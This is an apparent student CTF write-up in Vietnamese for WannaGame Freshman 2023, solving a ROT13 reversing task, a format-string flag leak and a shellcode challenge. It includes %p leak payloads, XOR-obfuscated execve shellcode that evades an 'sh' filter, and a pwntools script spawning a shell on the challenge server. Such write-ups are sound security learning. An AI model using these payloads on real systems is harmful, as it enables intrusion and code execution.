# REVERSE: Welcome 
```
**Level: easy
Decscripton: I just want to welcome you to the WannaGame Freshman 2023!!!**
```
[Welcome](https://cnsc.uit.edu.vn/ctf/files/d68c3530e27c38b01ab02fd39935b4dd/Welcome?token=eyJ1c2VyX2lkIjo4NjAsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE2N30.ZU-PvQ.s8HZnrcMrIFmWTVejrlWtkYPcow)
**SOLUTION**
 - Đầu tiền em sẽ check xem thử nó định dạng gì. May quá nó thuộc ELF=))
```
Welcome: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=XK8IRhzzBz5sOMhBwP-y/TR1mump5NAgqwCo6YuU-/kY8ewioQ25QNkmd1jqrG/606MEB1jPfUXaw2zBueX, stripped
```
 - Tiếp theo em quăng nó vào `Cutter` để disas nó ra thử.
![Screenshot from 2023-11-11 09-42-16](https://hackmd.io/_uploads/HJelQzaXT.png)
 - Quan sát thấy không gì đặc biệt nhưng nếu nhìn kỹ sẽ thấy một string khá đang nghi "có thể là flag"`J1_LBH_QVQ_VG______JRYPBZR_GB_GUR_JNAANTNZR_SERFUZNA_2023`
 - Nhìn tiếp ở bên dưới sẽ thấy chương trình gọi hàm` sym.go.main.rot`, click đúp vào hàm sẽ thấy một đoạn code khá dài 
  ![Screenshot from 2023-11-11 09-46-51](https://hackmd.io/_uploads/B1IOVfaXa.png)
 - Đọc sơ qua thì có thể hiểu đoạn code này dùng để encrypt `flag` của ta cần tìm theo ROT13. Vì vậy để decrypt lại em dùng `Cyberchef`
 - Copy đoạn ta nghi ngờ là flag và chọn ROT13 và lấy flag
 
`W1{YOU_DID_IT######WELCOME_TO_THE_WANNAGAME_FRESHMAN_2023!!!!!!!}`

---
# PWNable
## Pierre De Fermat
[Pierre](https://cnsc.uit.edu.vn/ctf/files/eb3dfa4a7737be8c6acaf084b031adcd/pierre_de_fermat.zip?token=eyJ1c2VyX2lkIjo4NjAsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE1NX0.ZU-dSw.rQB2lbkjUxxcskSIG9uctIBt2CE)
- Có bug format string ở đây
```
  fgets(format, v3 + 1, stdin);
  snprintf(v29, 0x95uLL, format);
```
- em theo link hướng dẫn https://www.youtube.com/watch?v=Vkv3s-_DYnM&list=PLEvZsp0uc3SEvgL_aZ9dtQ480RAdp6qQM&index=12
- Khi này e debug và dừng ở sprintf, em thấy flag được đưa vào stack => %p để leak
![image](https://hackmd.io/_uploads/SkFGYzaQa.png)
- `"%20$p|%21$p|%22$p|%23$p|%24$p|%25$p"`
```
Welcome to the House of F3rm4t
Input your valid size of name: 40
Input your name: %20$p|%21$p|%22$p|%23$p|%24$p|%25$p
Here is your magic: 0x5f733330647b3157|0x735f74346d723366|0x75765f674e317274|0x336c623472336e6c|0x646165645f73695f|0x726576335f6e695f
Bye, see u next year!!!
```
- `%26$p|%27$p|`
```
Welcome to the House of F3rm4t
Input your valid size of name: 40
Input your name: %26$p|%27$p|
Here is your magic: 0x3f3f5f6674635f79|0xe6be7b007d3f3f3f|
Bye, see u next year!!!
```

- Khi này em dùng kt.gy để reverse lại vì bị in ngược
- ![image](https://hackmd.io/_uploads/HJDj9M6Qa.png)
- ![image](https://hackmd.io/_uploads/ryvq5G6QT.png)
```W1{d03s_f3rm4t_str1Ng_vuln3r4bl3_is_dead_in_3very_ctf_?????}```


## Shellez
[Shellez](https://cnsc.uit.edu.vn/ctf/files/d8a1e52ec8300dee15945ed4b29109b2/shellez.zip?token=eyJ1c2VyX2lkIjo4NjAsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE1OH0.ZU-dqQ.hiccHJQuoZGdP22gKpEbjkCmAac)
- Bài này có vẻ filter 'sh'
```
result = strstr(a1, "sh");
  if ( result )
  {
LABEL_3:
    puts("This magic is unacceptable");
    exit(-1);
  }
```
- shellcode https://www.youtube.com/watch?v=OSlZZ3DecnQ&list=PLof-ZrQ3ol6Vhwnf4tuConmNBgIjrPKh4&index=5
- Nhờ kiến thức reverse nên ta có cách bypass filter 'sh' bằng cách sau
```
                xor    rdi,rdi
                push   rdi
                movabs rdi,0x7b443c187d5e7118
                movabs rax, 0x1337133713371337
                xor rdi, rax
```
- xor rdi, rax sẽ trả về
```
>>> hex(0x7b443c187d5e7118^0x1337133713371337)
'0x68732f2f6e69622f'    # /bin//sh
```
- em dùng https://defuse.ca/online-x86-assembler.htm#disassembly có được các byte shell



- script
```python=
from pwn import *
p = remote('45.122.249.68', 20005)
# p = process(exe.path)
gdb.attach(p, gdbscript='''
b* 0x5555555553f8

c
''')
input()


shell = "\x48\x31\xFF\x57\x48\xBF\x18\x71\x5E\x7D\x18\x3C\x44\x7B\x48\xB8\x37\x13\x37\x13\x37\x13\x37\x13\x48\x31\xC7\x57\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\x89\xE7\x48\x31\xC0\x48\x83\xC0\x3B\x0F\x05"
p.sendlineafter(b"magic", shell)
p.interactive()
```
```
W1{Sh311c0d1ng_1s_th3_m05t_b4s1c_5ki115_1n_b1n4ry_3xpl01t4ti0n_uh_huh
```